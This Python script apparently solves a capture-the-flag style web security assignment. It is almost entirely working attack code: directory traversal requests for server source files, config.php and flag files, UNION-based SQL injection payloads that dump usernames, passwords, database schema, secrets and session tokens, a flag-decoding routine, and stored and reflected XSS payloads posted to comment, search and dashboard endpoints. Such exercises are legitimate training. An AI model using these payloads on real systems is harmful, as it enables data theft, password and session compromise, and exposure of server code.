import requests
import base64
import json
import codecs
from dotenv import load_dotenv
import os

DOMAIN = "https://assignment1.h4ck3rhub.xyz/"
load_dotenv()

class ASSIGN1 :
    def __init__(self):
        self.session = requests.Session()
        self.base_url = DOMAIN
        self.token = os.getenv("ASSI1_TOKEN")
        x = self.request("/api/auth.php", json={"action": "verify_token", "token": self.token}, method="POST", retry=False)
    
    def request(self, path, data=None, json=None, method="GET", retry=True, params=None) :
        if method == "GET":
            response = self.session.get(self.base_url + path, params=params)
        elif method == "POST":
            response = self.session.post(self.base_url + path, data=data, json=json, params=params)
        try:
            res = response.json()
        except:
            return response.content
        
        if res.get('message', '') == "Authentication required":
            if retry :
                print("Authentication required, fetching new session id")
                return self.request(path, data=data, json=json, method=method, retry=False)
            else:
                print(res)
                print(response.content)
                print("No More Retries")
        return res

    def get_file(self, filename):
        output=f"dir_trav/{filename.split('/')[-1]}"
        res = self.request(f"/api/files.php?file={filename}")
        if res.get('content') :
            print(res['content'])
            with open(output, "w", encoding="utf-8") as f:
                f.write(res['content'])
        else :
            print(res)

    def inject(self, dump_file, search="", remove_email_stuff=True):
        path = "api/users.php"
        params = {"search": search}
        res = self.request(path, params=params)
        if not remove_email_stuff:
            return res
        if not res.get('users'):
            print(res)
            return
        users = res['users']
        req = []
        for user in users:
            if not user.get('email'):
                req.append(user)
        with open(f"sql/{dump_file}", "w") as f:
            f.write(json.dumps(req, indent=4))
        return res

def directory_traversal():
    files = [
        "../../../../../../../var/www/html/dashboard.php",
        "../../../../../../var/www/html/api/auth.php", 
        "../../../../../../var/www/html/api/files.php", 
        "../../../../../../var/www/html/api/search.php", 
        "../../../../../../var/www/html/api/users.php", 
        "../../../../../../var/www/html/api/comments.php"
        "../../../../../../var/www/html/config.php", 
        "../../../../../../var/www/html/flag_helper.php", 
        "../../../../../../var/www/html/files/readme.txt", 
        "../../../../../../var/www/html/files/docs/api.txt", 
        "../../../../../../var/www/html/files/docs/security.txt", 
        "../../../../../../var/www/.system/.cache_data",
        "../../../../../../~/flag.txt",
        "../../../../../../../home/flag.txt",
    ]
    for file in files:
        assign.get_file(filename=file)

def sql_injection():
    assign.inject(dump_file="passwords.json", search="%' UNION SELECT username,password,NULL,NULL FROM users-- ")
    assign.inject(dump_file="columns.json", search="%' UNION SELECT column_name,table_name,NULL,NULL FROM information_schema.columns -- ")
    assign.inject(dump_file="secrets.json", search="%' UNION SELECT flag,difficulty,NULL,NULL FROM secrets -- ")
    assign.inject(dump_file="sessions.json", search="%' UNION SELECT user_id,token,NULL,NULL FROM sessions WHERE user_id = 31 -- ")


def decode_flag(encoded_flag):
    try :
        decoded = base64.b64decode(encoded_flag)
        unreversed = decoded[::-1]
        original = codecs.decode(unreversed.decode('ascii'), 'rot13')
    except :
        return ""
    return original

def add_flags():
    with open("sql/secrets.json", "r") as f:
        secrets = json.load(f)
    with open("flags.txt", "a") as f:
        for secret in secrets:
            decoded_flag = decode_flag(secret['id'])
            if("FLAG{" in decoded_flag) :
                f.write(decoded_flag + f": {secret['username']}\n")
    with open("dir_trav/flag.txt", "r") as f:
        flag = f.read()
    with open("flags.txt", "a") as f:
        f.write(flag + "\n")


def perform_xss():
    output = assign.request("/api/comments.php", data={"comment": "<img src=nothing onerror=alert('XSS')>"}, method="POST")
    output2 = assign.request("/api/search.php", data={"q": "<img src=nothing onerror=alert('XSS')>"})
    output3URL = "https://assignment1.h4ck3rhub.xyz/dashboard.php?user=%3Cimg%20src=nothing%20onerror=alert(%27XSS%27)%3E"
    
    # output = assign.request("/api/comments.php", data={"comment": "<img src=nothing onerror=while(true)alert('XSS')>"}, method="POST")
    # print(output)

if __name__ == "__main__":
    assign = ASSIGN1()
    directory_traversal()
    sql_injection()
    add_flags()
    perform_xss()